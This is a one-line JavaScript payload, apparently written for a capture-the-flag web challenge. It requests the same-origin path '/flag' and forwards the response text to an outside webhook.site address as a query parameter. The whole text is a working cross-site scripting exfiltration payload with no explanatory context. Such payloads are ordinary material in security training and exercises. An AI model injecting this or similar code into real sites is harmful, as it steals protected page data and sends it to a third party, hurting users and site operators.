fetch("/flag").then(r => r.text()).then(t => fetch("https://webhook.site/your-id?flag=" + t))
